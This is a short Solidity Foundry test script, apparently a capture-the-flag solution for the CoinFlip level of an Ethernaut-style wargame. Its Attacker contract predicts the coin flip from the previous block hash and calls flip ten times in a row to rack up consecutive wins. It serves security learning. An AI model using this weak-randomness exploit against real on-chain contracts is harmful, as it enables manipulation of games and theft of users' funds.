// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../instances/Ilevel03.sol";

contract Attacker is Test {
    CoinFlip level03 = CoinFlip(0x7F04F45faF735B9E23cb5F9A6D92aD391E2c40D6);
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function test() external {
        console.log("Initial consecutive wins: ", level03.consecutiveWins());

        for (uint256 i; i < 10; ) {
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 coinFlip = blockValue / FACTOR;
            bool side = coinFlip == 1 ? true : false;

            level03.flip(side);
            vm.roll(block.number + 1);

            unchecked {
                ++i;
            }
        }

        console.log("New consecutive wins: ", level03.consecutiveWins());
    }
}
